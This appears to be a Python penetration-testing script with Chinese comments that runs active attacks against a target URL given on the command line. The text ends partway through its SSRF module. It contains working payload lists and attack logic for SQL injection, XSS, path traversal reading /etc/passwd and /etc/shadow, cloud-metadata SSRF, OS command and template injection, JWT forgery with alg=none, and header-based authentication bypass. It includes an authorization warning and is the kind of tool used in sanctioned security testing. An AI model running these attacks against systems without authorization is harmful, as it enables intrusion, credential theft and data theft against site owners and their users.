#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web 主动攻击审计脚本 — 主动探测而非被动检查

覆盖 12 个攻击模块，每个模块都执行真实攻击载荷并分析响应差异：
  1. SQL 注入探测 (5 种注入点 × 6 种绕过)
  2. XSS 探测 (反射型 + DOM 型 + 编码绕过)
  3. 路径穿越 (双重编码 / Null字节 / 超长路径 / Windows/Unix)
  4. CORS 利用链 (Origin 反射 / 子域通配 / Null Origin)
  5. 认证绕过 (JWT 篡改 / 无签名接受 / 空认证 / Header 注入)
  6. SSRF 探测 (内网 IP + Cloud 元数据 + 协议绕过)
  7. 命令注入 (OS 命令 + 模板注入 SSTI)
  8. IDOR 探测 (ID 遍历 + 类型混淆 + 批量枚举)
  9. API 参数篡改 (类型混淆 / 数组注入 / 批量赋值 / 原型污染)
  10. 竞态条件 (并发请求导致的状态不一致)
  11. 敏感信息提取 (.git / .env / debug 端点 / 配置泄露)
  12. HTTP 请求走私 (CL.TE / TE.CL 探测)

用法:
  python web_attack.py https://target.com
  python web_attack.py https://target.com --i-am-authorized  # 开启全部主动攻击
  python web_attack.py https://target.com --depth 2 --timeout 15
  python web_attack.py https://target.com --skip-ids  # 跳过可能触发 WAF 的模块
  python web_attack.py https://target.com --only sqli,xss,ssrf  # 只跑指定模块
  python web_attack.py https://target.com --proxy http://127.0.0.1:8080  # 走代理
  python web_attack.py https://target.com --auth "Bearer eyJ..."  # 带认证测试

输出:
  - 终端实时彩色输出
  - web_attack_report_<domain>_<timestamp>.md  分级攻击报告
  - web_attack_raw_<domain>_<timestamp>.json   原始请求/响应对

⚠️  仅对授权目标使用。CTF / 自有系统 / 书面授权的渗透测试。
"""

import re
import json
import time
import hashlib
import argparse
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    import urllib3
    from urllib3.exceptions import InsecureRequestWarning
    urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] 需要安装 requests: pip install requests")
    exit(1)


# ═══════════════════════════════════════════════════════════════
# 全局配置
# ═══════════════════════════════════════════════════════════════

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# 默认 User-Agent 池 — 模拟真实浏览器
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]

# SQL 注入载荷 — 6 种绕过策略
SQLI_PAYLOADS = [
    # 经典
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1' /*",
    "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
    # 数字型
    "1 OR 1=1", "1 OR 1=1--", "1 OR 1=1/*",
    # 布尔盲注
    "' AND '1'='1", "' AND '1'='2",
    "1 AND 1=1", "1 AND 1=2",
    # 时间盲注
    "'; WAITFOR DELAY '0:0:3'--", "1; WAITFOR DELAY '0:0:3'--",
    "' AND SLEEP(3)--", "1 AND SLEEP(3)",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    # 时间盲注 - PostgreSQL
    "' OR pg_sleep(3)--", "1; SELECT pg_sleep(3)--",
    # 联合查询
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # 编码绕过
    "'/**/OR/**/1=1--", "%27%20OR%20%271%27%3D%271",
    "' OR 1%3D1--",
]

# XSS 载荷 — 多种编码和绕过
XSS_PAYLOADS = [
    # 基础
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # 事件处理器
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    # 编码绕过
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
    '<svg/onload=alert(1)>',
    '<ScRiPt>alert(1)</ScRiPt>',
    # 模板注入 (同时检测 SSTI)
    '{{7*7}}', '${7*7}', '<%=7*7%>', '#{7*7}', '{{config}}',
    # DOM 型
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
]

# 路径穿越载荷
PATH_TRAVERSAL_PAYLOADS = [
    # Unix
    "../../../etc/passwd", "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../etc/shadow",
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system32\\config\\sam",
    # 双重编码
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Null 字节 (旧版 PHP/Java)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    # 超长路径
    "/" + "../" * 20 + "etc/passwd",
    # 容器路径
    "/proc/self/environ", "/proc/self/cmdline",
    "/var/log/nginx/access.log", "/var/log/apache2/access.log",
]

# SSRF 内网目标
SSRF_TARGETS = [
    # Cloud 元数据
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/openstack/latest/meta_data.json",
    "http://100.100.100.200/latest/meta-data/",  # 阿里云
    # 内网 IP
    "http://127.0.0.1", "http://localhost",
    "http://127.0.0.1:22", "http://127.0.0.1:3306",
    "http://127.0.0.1:6379", "http://127.0.0.1:8080",
    "http://127.0.0.1:9200",  # Elasticsearch
    "http://127.0.0.1:27017", # MongoDB
    "http://10.0.0.1", "http://10.0.0.2",
    "http://192.168.1.1", "http://192.168.0.1",
    "http://172.16.0.1", "http://172.17.0.1",
    # 协议绕过
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_*1%0d%0aPING",  # Redis
    "dict://127.0.0.1:6379/INFO",
]

# 命令注入载荷
CMDI_PAYLOADS = [
    # 分号
    "; id", "; whoami", "; cat /etc/passwd",
    # 管道
    "| id", "| whoami",
    # 反引号
    "`id`", "`whoami`",
    # $()
    "$(id)", "$(whoami)", "$(cat /etc/passwd)",
    # 换行
    "\nid", "\nwhoami",
    # Windows
    "& dir", "& whoami", "| dir",
    # 延时确认
    "; sleep 5", "| sleep 5", "& timeout 5",
    # SSTI
    "{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>",
    "{{config}}", "{{self.__class__.__mro__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
]

# 敏感路径字典 — 按类别分组
SENSITIVE_PATHS = {
    "version_control": [
        "/.git/HEAD", "/.git/config", "/.git/refs/heads/master",
        "/.git/index", "/.svn/entries", "/.svn/wc.db",
        "/.hg/store/00manifest.i", "/.bzr/checkout/dirstate",
    ],
    "config_leak": [
        "/.env", "/.env.backup", "/.env.production", "/.env.local",
        "/.env.development", "/.env.staging",
        "/config.json", "/config.yml", "/config.yaml",
        "/appsettings.json", "/application.yml",
        "/web.config", "/wp-config.php",
        "/.htaccess", "/.htpasswd",
        "/docker-compose.yml", "/docker-compose.yaml",
        "/Dockerfile", "/Makefile", "/package.json",
        "/composer.json", "/composer.lock", "/Gemfile",
        "/requirements.txt", "/Pipfile", "/go.mod",
    ],
    "admin_panels": [
        "/admin", "/admin/", "/admin/login", "/administrator",
        "/console", "/dashboard", "/manager/html",
        "/phpmyadmin", "/phpmyadmin/", "/pma",
        "/wp-admin", "/wp-login.php",
        "/cpanel", "/server-status", "/server-info",
    ],
    "debug_endpoints": [
        "/debug", "/debug/pprof/", "/debug/pprof/goroutine",
        "/debug/vars", "/debug/requests",
        "/actuator", "/actuator/health", "/actuator/env",
        "/actuator/mappings", "/actuator/configprops",
        "/actuator/heapdump", "/actuator/threaddump",
        "/trace", "/jolokia", "/jolokia/list",
        "/swagger", "/swagger-ui.html", "/swagger/index.html",
        "/api-docs", "/docs", "/openapi.json", "/openapi.yaml",
        "/graphql", "/graphiql", "/playground",
    ],
    "cloud_metadata": [
        "/latest/meta-data/", "/latest/meta-data/iam/",
        "/latest/user-data", "/latest/dynamic/instance-identity/",
    ],
    "common_frameworks": [
        "/api/status", "/api/health", "/api/info", "/api/version",
        "/api/v1/", "/api/v2/", "/api/keys", "/api/users",
        "/api/admin", "/api/config", "/api/auth/login",
        "/api/oauth/github", "/api/setup", "/api/register",
        "/telescope/requests", "/_ignition/health-check",
        "/_debugbar", "/_profiler",
    ],
    "backup_files": [
        "/backup", "/backup.sql", "/backup.zip", "/backup.tar.gz",
        "/db.sql", "/dump.sql", "/database.sql",
        "/.DS_Store", "/Thumbs.db",
        "/index.php.bak", "/web.config.bak",
        "/www.zip", "/www.tar.gz", "/wwwroot.zip",
        "/site.zip", "/web.zip",
    ],
}


# ═══════════════════════════════════════════════════════════════
# 核心攻击引擎
# ═══════════════════════════════════════════════════════════════

class WebAttacker:
    """主动攻击审计引擎"""

    def __init__(self, target_url, timeout=10, proxy=None, auth_header=None,
                 depth=1, skip_ids=False, verify_ssl=False, i_am_authorized=False):
        self.target = target_url.rstrip("/")
        self.parsed = urlparse(self.target)
        self.domain = self.parsed.hostname
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.skip_ids = skip_ids
        self.i_am_authorized = i_am_authorized

        self._local = threading.local()

        self._default_headers = {
            "User-Agent": USER_AGENTS[0],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
        }

        if auth_header:
            self._default_headers["Authorization"] = auth_header

        self._default_proxies = {"http": proxy, "https": proxy} if proxy else None

        # 发现收集
        self.findings = []
        self.discovered_endpoints = []
        self.baseline_responses = {}
        self.raw_log = []

        # 线程锁
        self._lock = threading.Lock()

    @property
    def session(self):
        if not hasattr(self._local, 'session'):
            s = requests.Session()
            s.verify = self.verify_ssl
            s.headers.update(self._default_headers)
            if self._default_proxies:
                s.proxies = self._default_proxies
            s.timeout = self.timeout
            self._local.session = s
        return self._local.session

    def _log_finding(self, module, severity, title, detail, request=None, response=None):
        """记录一个发现"""
        finding = {
            "module": module,
            "severity": severity,  # CRITICAL / HIGH / MEDIUM / LOW / INFO
            "title": title,
            "detail": detail,
            "timestamp": datetime.now().isoformat(),
        }
        if request:
            finding["request"] = {
                "method": request.method,
                "url": request.url,
                "headers": dict(request.headers),
                "body": request.body[:500] if request.body else None,
            }
        if response:
            finding["response"] = {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body_snippet": response.text[:500] if response.text else None,
                "content_length": len(response.content) if response.content else 0,
            }
        with self._lock:
            self.findings.append(finding)
            self.raw_log.append(finding)

        # 终端实时输出
        color = {
            "CRITICAL": RED, "HIGH": RED, "MEDIUM": YELLOW,
            "LOW": CYAN, "INFO": RESET
        }.get(severity, RESET)
        print(f"  {color}[{severity}]{RESET} {title}")
        if detail:
            print(f"         {detail[:120]}")

    def _request(self, method, url, **kwargs):
        """安全请求封装 — 捕获异常"""
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("allow_redirects", True)
        kwargs.setdefault("verify", self.verify_ssl)
        try:
            resp = self.session.request(method, url, **kwargs)
            return resp
        except requests.exceptions.RequestException as e:
            return None

    def _is_different_from_baseline(self, path, resp):
        """对比基线响应判断是否异常"""
        if not resp:
            return False
        baseline = self.baseline_responses.get("404_baseline")
        if not baseline:
            return resp.status_code != 404
        # 对比状态码和内容长度
        if resp.status_code != baseline["status_code"]:
            return True
        if abs(len(resp.text) - baseline["content_length"]) > 200:
            return True
        return False

    # ───────────────────────────────────────────────────────
    # 阶段 0: 基线建立
    # ───────────────────────────────────────────────────────

    def establish_baseline(self):
        """建立基线响应 — 用于后续异常检测"""
        print(f"\n{BOLD}[阶段0] 建立基线响应{RESET}")

        # 主页基线
        resp = self._request("GET", self.target)
        if resp:
            self.baseline_responses["home"] = {
                "status_code": resp.status_code,
                "content_length": len(resp.text),
                "headers": dict(resp.headers),
            }
            print(f"  主页: {resp.status_code} / {len(resp.text)} bytes")

        # 404 基线 — 随机路径
        rand_path = f"/nonexistent_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        resp = self._request("GET", self.target + rand_path)
        if resp:
            self.baseline_responses["404_baseline"] = {
                "status_code": resp.status_code,
                "content_length": len(resp.text),
            }
            print(f"  404基线: {resp.status_code} / {len(resp.text)} bytes")

        # 检测 SPA catch-all
        if self.baseline_responses.get("404_baseline", {}).get("status_code") == 200:
            self._log_finding("baseline", "INFO", "SPA catch-all 检测",
                              "随机路径返回 200，可能为 SPA 前端路由。后续扫描需对比内容长度。")

        # 安全头检测 (仅首页)
        home_resp = self._request("GET", self.target)
        if home_resp:
            self._check_security_headers(home_resp)

    def _check_security_headers(self, resp):
        """检测安全响应头"""
        missing = []
        checks = {
            "Strict-Transport-Security": "HSTS 未设置 → SSL stripping 风险",
            "Content-Security-Policy": "CSP 未设置 → XSS/注入无防护",
            "X-Frame-Options": "X-Frame-Options 未设置 → Clickjacking 风险",
            "X-Content-Type-Options": "X-Content-Type-Options 未设置 → MIME 嗅探",
            "Referrer-Policy": "Referrer-Policy 未设置 → URL 令牌可能泄露",
            "Permissions-Policy": "Permissions-Policy 未设置 → 浏览器特性无限制",
        }
        for header, desc in checks.items():
            if header.lower() not in {k.lower(): v for k, v in resp.headers.items()}:
                missing.append((header, desc))

        if missing:
            self._log_finding("headers", "MEDIUM",
                              f"缺少 {len(missing)} 个安全响应头",
                              "; ".join(h for h, _ in missing))

        # 信息泄露
        leak_headers = ["Server", "X-Powered-By", "X-AspNet-Version",
                        "X-Runtime", "X-Version", "X-New-Api-Version",
                        "X-Oneapi-Request-Id", "Cache-Version"]
        found_leaks = []
        for h in leak_headers:
            val = resp.headers.get(h) or resp.headers.get(h.lower())
            if val:
                found_leaks.append(f"{h}: {val}")
        if found_leaks:
            self._log_finding("headers", "LOW",
                              "响应头信息泄露",
                              "; ".join(found_leaks))

    # ───────────────────────────────────────────────────────
    # 模块 1: SQL 注入探测
    # ───────────────────────────────────────────────────────

    def attack_sqli(self):
        """SQL 注入主动探测"""
        print(f"\n{BOLD}[模块1] SQL 注入探测{RESET}")

        # 先找带参数的端点
        test_points = self._find_injectable_params()
        if not test_points:
            # 没有已知参数时，尝试常见参数名
            test_points = [
                (self.target + "/api/", "id", "GET"),
                (self.target + "/api/", "page", "GET"),
                (self.target + "/api/", "search", "GET"),
                (self.target + "/api/", "query", "GET"),
                (self.target + "/api/user", "id", "GET"),
                (self.target + "/api/users", "id", "GET"),
                (self.target + "/api/auth/login", "username", "POST"),
                (self.target + "/api/auth/login", "password", "POST"),
            ]

        for url, param, method in test_points:
            # 先获取正常响应基线
            if method == "GET":
                baseline = self._request("GET", f"{url}?{param}=1")
            else:
                baseline = self._request("POST", url, data={param: "test"})

            if not baseline:
                continue

            baseline_len = len(baseline.text)
            baseline_code = baseline.status_code

            for payload in SQLI_PAYLOADS:
                if self.skip_ids and ("SLEEP" in payload or "WAITFOR" in payload):
                    continue

                if method == "GET":
                    test_url = f"{url}?{param}={quote(payload)}"
                    resp = self._request("GET", test_url)
                else:
                    resp = self._request("POST", url, data={param: payload})

                if not resp:
                    continue

                # 响应差异分析
                diff = abs(len(resp.text) - baseline_len)
                code_changed = resp.status_code != baseline_code

                # SQL 错误关键词检测
                sql_errors = [
                    "SQL syntax", "mysql_", "ORA-", "PostgreSQL",
                    "Microsoft SQL", "sqlite_", "SQLSTATE",
                    "unclosed quotation", "String was not recognized",
                    "Conversion failed", "ODBC SQL Server",
                    "Supplied argument is not a valid",
                    "mysql_fetch", "pg_query", "sqlite_query",
                ]
                error_found = any(err.lower() in resp.text.lower() for err in sql_errors)

                # 时间盲注检测
                time_based = False
                if "SLEEP" in payload or "WAITFOR" in payload:
                    time_based = resp.elapsed.total_seconds() >= 3.0

                # 判定
                if error_found:
                    self._log_finding("sqli", "CRITICAL",
                                      f"SQL 错误泄露: {param}={payload[:30]}",
                                      f"端点: {url}, 参数: {param}")
                    break  # 已确认，跳出载荷循环
                elif time_based:
                    self._log_finding("sqli", "CRITICAL",
                                      f"时间盲注确认: {param}={payload[:30]}",
                                      f"端点: {url}, 延迟 >= 3s")
                    break
                elif diff > 500 or code_changed:
                    # 布尔差异 — 需要进一步确认
                    self._log_finding("sqli", "HIGH",
                                      f"SQL 注入疑似(响应差异): {param}={payload[:30]}",
                                      f"状态码: {baseline_code}→{resp.status_code}, "
                                      f"长度差: {diff} bytes, 端点: {url}")

    def _find_injectable_params(self):
        """从已发现端点中提取可注入参数"""
        points = []
        for ep in self.discovered_endpoints:
            url = ep.get("url", "")
            # 相对路径处理: 拼接到 target
            if url and not url.startswith("http"):
                url = urljoin(self.target, url)
            if "?" in url:
                # 提取 URL 参数
                base, qs = url.split("?", 1)
                for pair in qs.split("&"):
                    if "=" in pair:
                        key = pair.split("=")[0]
                        points.append((base, key, "GET"))
            # POST 端点
            if ep.get("methods") and "POST" in ep.get("methods", []):
                # 常见 POST 参数
                for param in ["username", "email", "search", "query", "id", "name"]:
                    points.append((url, param, "POST"))
        return points

    # ───────────────────────────────────────────────────────
    # 模块 2: XSS 探测
    # ───────────────────────────────────────────────────────

    def attack_xss(self):
        """XSS 主动探测"""
        print(f"\n{BOLD}[模块2] XSS 探测{RESET}")

        # 反射型 XSS — 在所有参数中注入
        test_points = self._find_injectable_params()
        if not test_points:
            test_points = [
                (self.target + "/", "q", "GET"),
                (self.target + "/", "search", "GET"),
                (self.target + "/", "name", "GET"),
                (self.target + "/api/", "callback", "GET"),
                (self.target + "/api/", "redirect", "GET"),
            ]

        for url, param, method in test_points:
            for payload in XSS_PAYLOADS:
                if method == "GET":
                    test_url = f"{url}?{param}={quote(payload)}"
                    resp = self._request("GET", test_url)
                else:
                    resp = self._request("POST", url, data={param: payload})

                if not resp:
                    continue

                # 检查载荷是否原样出现在响应中
                # 去除编码后对比
                raw_payload = payload
                decoded_resp = unquote(resp.text)

                if raw_payload in resp.text or raw_payload in decoded_resp:
                    # 进一步检查是否在 HTML 上下文中（而非 JS 字符串中）
                    severity = "HIGH"
                    if "<script>" in payload.lower() and "<script>" in resp.text.lower():
                        severity = "CRITICAL"

                    self._log_finding("xss", severity,
                                      f"反射型 XSS: {param}={payload[:40]}",
                                      f"端点: {url}, 载荷原样出现在响应中")
                    break  # 确认一个参数即可

                # SSTI 特征检测
                ssti_markers = ["49", "7777777", "config", "__class__"]
                if any(m in resp.text for m in ssti_markers) and \
                   any(t in payload for t in ["{{", "${", "<%", "#{"]):
                    self._log_finding("xss", "CRITICAL",
                                      f"SSTI 模板注入确认: {param}={payload[:40]}",
                                      f"端点: {url}, 表达式求值结果出现在响应中")
                    break

    # ───────────────────────────────────────────────────────
    # 模块 3: 路径穿越
    # ───────────────────────────────────────────────────────

    def attack_path_traversal(self):
        """路径穿越主动攻击"""
        print(f"\n{BOLD}[模块3] 路径穿越攻击{RESET}")

        # 常见文件读取端点
        traversal_points = [
            "/api/file", "/api/download", "/api/files",
            "/api/attachment", "/api/document", "/api/read",
            "/static/", "/uploads/", "/files/", "/media/",
            "/download", "/view", "/read", "/get",
        ]

        # 常见参数名
        file_params = ["file", "path", "name", "dir", "folder",
                       "doc", "document", "attachment", "src", "url"]

        for endpoint in traversal_points:
            for param in file_params[:3]:  # 每端点只测 3 个参数
                for payload in PATH_TRAVERSAL_PAYLOADS:
                    test_url = f"{self.target}{endpoint}?{param}={quote(payload)}"
                    resp = self._request("GET", test_url)

                    if not resp:
                        continue

                    # 文件内容特征检测
                    file_signatures = {
                        "/etc/passwd": ["root:", "nobody:", "daemon:"],
                        "/etc/shadow": ["root:$", "root:!"],
                        "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
                        "sam": ["SAM", "REGISTRY"],
                        "/proc/self/environ": ["HOME=", "PATH=", "USER="],
                        "/proc/self/cmdline": None,  # 二进制
                        "access.log": ["HTTP/", "GET ", "POST "],
                    }

                    for sig_file, sig_patterns in file_signatures.items():
                        if sig_file in payload and sig_patterns:
                            if any(p in resp.text for p in sig_patterns):
                                self._log_finding("path_traversal", "CRITICAL",
                                                  f"路径穿越确认: 读取 {sig_file}",
                                                  f"载荷: {param}={payload[:60]}, "
                                                  f"端点: {endpoint}")
                                break
                    else:
                        # 响应差异 — 可能穿越但内容不同
                        if resp.status_code == 200 and self._is_different_from_baseline(endpoint, resp):
                            if len(resp.text) > 100 and len(resp.text) < 100000:
                                self._log_finding("path_traversal", "MEDIUM",
                                                  f"路径穿越疑似: {param}={payload[:40]}",
                                                  f"端点: {endpoint}, 响应 {len(resp.text)} bytes")
                    break  # 每参数只测一个载荷子集

    # ───────────────────────────────────────────────────────
    # 模块 4: CORS 利用链
    # ───────────────────────────────────────────────────────

    def attack_cors(self):
        """CORS 配置攻击 — 不只检测，还要验证利用链"""
        print(f"\n{BOLD}[模块4] CORS 利用链测试{RESET}")

        # 收集所有已发现的 API 端点
        test_endpoints = [ep["url"] for ep in self.discovered_endpoints
                          if "/api/" in ep.get("url", "")]
        if not test_endpoints:
            test_endpoints = [self.target + "/api/", self.target + "/api/status"]

        evil_origins = [
            f"https://evil.{self.domain}",
            "https://evil.com",
            "null",
            "https://evil.com" + self.parsed.netloc,  # 拼接域名
            f"http://{self.domain}",  # HTTP 降级
            f"https://{self.domain}.evil.com",  # 子域接管
        ]

        for endpoint in test_endpoints[:10]:
            for origin in evil_origins:
                headers = {
                    "Origin": origin,
                    "Access-Control-Request-Method": "POST",
                    "Access-Control-Request-Headers": "Authorization,Content-Type",
                }
                resp = self._request("OPTIONS", endpoint, headers=headers)

                if not resp:
                    continue

                allow_origin = resp.headers.get("Access-Control-Allow-Origin", "")
                allow_creds = resp.headers.get("Access-Control-Allow-Credentials", "")
                allow_headers = resp.headers.get("Access-Control-Allow-Headers", "")
                allow_methods = resp.headers.get("Access-Control-Allow-Methods", "")

                # Origin 反射 — 最危险的配置
                if allow_origin == origin and allow_creds.lower() == "true":
                    self._log_finding("cors", "CRITICAL",
                                      f"CORS Origin 反射 + Credentials: {origin}",
                                      f"端点: {endpoint}, 攻击者可以从 {origin} "
                                      f"读取带认证的响应")
                elif allow_origin == "*" and allow_creds.lower() == "true":
                    self._log_finding("cors", "HIGH",
                                      f"CORS * + Credentials (规范不一致)",
                                      f"端点: {endpoint}, 非浏览器客户端可利用")
                elif allow_origin == origin:
                    self._log_finding("cors", "MEDIUM",
                                      f"CORS Origin 反射(无 Credentials): {origin}",
                                      f"端点: {endpoint}, 可读取公开数据")
                elif allow_origin == "*" and allow_headers == "*":
                    self._log_finding("cors", "MEDIUM",
                                      f"CORS 全通配: Origin=* + Headers=*",
                                      f"端点: {endpoint}")

    # ───────────────────────────────────────────────────────
    # 模块 5: 认证绕过
    # ───────────────────────────────────────────────────────

    def attack_auth_bypass(self):
        """认证绕过攻击"""
        print(f"\n{BOLD}[模块5] 认证绕过攻击{RESET}")

        # 需要认证的端点
        auth_endpoints = [
            "/api/user", "/api/users", "/api/admin",
            "/api/keys", "/api/config", "/api/settings",
            "/api/profile", "/api/account", "/api/dashboard",
            "/admin", "/console", "/dashboard",
        ]

        for ep in auth_endpoints:
            url = self.target + ep
            baseline = self._request("GET", url)

            if not baseline:
                continue

            # 如果本身就是 200，可能不需要认证或已绕过
            if baseline.status_code == 200:
                # 检查是否有敏感数据
                sensitive_keywords = ["password", "secret", "token", "api_key",
                                     "private_key", "credential", "admin"]
                content_lower = baseline.text.lower()
                found_sensitive = [kw for kw in sensitive_keywords if kw in content_lower]

                if found_sensitive:
                    self._log_finding("auth_bypass", "CRITICAL",
                                      f"未认证访问敏感数据: {ep}",
                                      f"发现关键词: {', '.join(found_sensitive)}")

            # JWT 篡改测试
            if self.session.headers.get("Authorization", "").startswith("Bearer ey"):
                jwt_token = self.session.headers["Authorization"].split(" ")[1]
                self._test_jwt_bypass(url, jwt_token)

            # 各种绕过手法
            bypass_headers = [
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Original-URL": ep},
                {"X-Rewrite-URL": ep},
                {"X-Custom-IP-Authorization": "127.0.0.1"},
                {"X-Real-IP": "127.0.0.1"},
                {"X-Forwarded-Host": "localhost"},
                {"X-Host": "localhost"},
                {"X-Forwarded-Server": "localhost"},
                {"X-HTTP-Method-Override": "PUT"},
                {"X-Method-Override": "PUT"},
                {"Content-Type": "application/json"},  # 有些框架只检查 JSON
            ]

            for bypass_h in bypass_headers:
                resp = self._request("GET", url, headers=bypass_h)
                if not resp:
                    continue
                if resp.status_code == 200 and baseline.status_code != 200:
                    header_name = list(bypass_h.keys())[0]
                    self._log_finding("auth_bypass", "HIGH",
                                      f"认证绕过: {header_name}: {list(bypass_h.values())[0]}",
                                      f"端点: {ep}, 原状态: {baseline.status_code} → 200")

            # HTTP 方法篡改
            for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]:
                if method == "GET":
                    continue
                resp = self._request(method, url)
                if resp and resp.status_code == 200 and baseline.status_code != 200:
                    self._log_finding("auth_bypass", "HIGH",
                                      f"方法篡改绕过: {method} {ep}",
                                      f"原 GET 状态: {baseline.status_code}, "
                                      f"{method} 状态: 200")

    def _test_jwt_bypass(self, url, token):
        """JWT 篡改测试"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            import base64

            # 解码 header 和 payload
            def b64_decode(s):
                s += "=" * (4 - len(s) % 4)
                return json.loads(base64.urlsafe_b64decode(s))

            header = b64_decode(parts[0])
            payload = b64_decode(parts[1])

            # 攻击 1: 算法 none
            none_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            none_payload = parts[1]
            none_token = f"{none_header}.{none_payload}."
            resp = self._request("GET", url, headers={"Authorization": f"Bearer {none_token}"})
            if resp and resp.status_code == 200:
                self._log_finding("auth_bypass", "CRITICAL",
                                  "JWT none 算法绕过",
                                  f"端点: {url}, 服务器接受了 alg=none 的 token")

            # 攻击 2: RS256 → HS256 算法混淆
            if header.get("alg") == "RS256":
                hs_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                ).rstrip(b"=").decode()
                # 用公钥作为 HMAC 密钥（如果服务器错误地用公钥验证 HS256）
                # 这里只检测服务器是否接受 HS256 头部变更
                fake_token = f"{hs_header}.{parts[1]}.{parts[2]}"
                resp = self._request("GET", url, headers={"Authorization": f"Bearer {fake_token}"})
                # 如果返回不同错误（不是"无效算法"），说明可能存在混淆
                if resp and resp.status_code not in [401, 403]:
                    self._log_finding("auth_bypass", "HIGH",
                                      "JWT RS256→HS256 算法混淆疑似",
                                      f"端点: {url}, 变更算法后状态码: {resp.status_code}")

            # 攻击 3: kid 注入
            if "kid" in header:
                kid_payloads = ["../../dev/null", "| whoami", "${7*7}"]
                for kid_p in kid_payloads:
                    mod_header = dict(header)
                    mod_header["kid"] = kid_p
                    kid_h = base64.urlsafe_b64encode(
                        json.dumps(mod_header).encode()
                    ).rstrip(b"=").decode()
                    kid_token = f"{kid_h}.{parts[1]}.{parts[2]}"
                    resp = self._request("GET", url, headers={"Authorization": f"Bearer {kid_token}"})
                    if resp and "49" in resp.text:  # SSTI in kid
                        self._log_finding("auth_bypass", "CRITICAL",
                                          f"JWT kid SSTI 注入: {kid_p}",
                                          f"端点: {url}, 表达式求值结果出现在响应中")

        except Exception:
            pass  # JWT 解析失败，跳过

    # ───────────────────────────────────────────────────────
    # 模块 6: SSRF 探测
    # ───────────────────────────────────────────────────────

    def attack_ssrf(self):
        """SSRF 主动探测"""
        print(f"\n{BOLD}[模块6] SSRF 探测{RESET}")

        # SSRF 常见参数名
        ssrf_params = ["url", "uri", "path", "dest", "redirect",
                       "target", "rurl", "src", "source", "link",
                       "site", "fetch", "callback", "return",
                       "next", "goto", "reference", "domain"]

        # SSRF 常见端点
        ssrf_endpoints = [
            "/api/fetch", "/api/proxy", "/api/redirect",
            "/api/url", "/api/load", "/api/render",
            "/api/preview", "/api/image", "/api/convert",
            "/api/import", "/api/webhook", "/api/callback",
            "/api/og", "/api/embed", "/api/preview",
            "/webhook", "/oauth/callback",
        ]

        # Cloud 元数据特征
        cloud_signatures = {
            "169.254.169.254": ["ami-id", "instance-id", "iam", "reservation",
                                "security-credentials", "AWS"],
            "metadata.google.internal": ["computeMetadata", "project", "instance"],
            "100.100.100.200": ["instance-id", "region-id", "ECS"],
        }

        for endpoint in ssrf_endpoints:
            url = self.target + endpoint
            # 先检查端点是否存在
            probe = self._request("GET", url)
            if not probe or probe.status_code == 404:
                continue

            for param in ssrf_params[:5]:
                for ssrf_target in SSRF_TARGETS:
                    # GET
                    test_url = f"{url}?{param}={quote(ssrf_target)}"
                    resp = self._request("GET", test_url, timeout=8)

                    if not resp:
                        continue

                    # 检查云元数据特征
                    for sig_host, sig_patterns in cloud_signatures.items():
                        if sig_host in ssrf_target:
                            if any(p in resp.text for p in sig_patterns):
                                self._log_finding("ssrf", "CRITICAL",
                                                  f"SSRF 云元数据泄露: {ssrf_target}",
                                                  f"端点: {endpoint}, 参数: {param}")
                                break

                    # 内网服务特征
                    internal_sigs = ["ssh", "mysql", "redis", "mongodb",
                                     "elasticsearch", "HTTP/1.1 200",
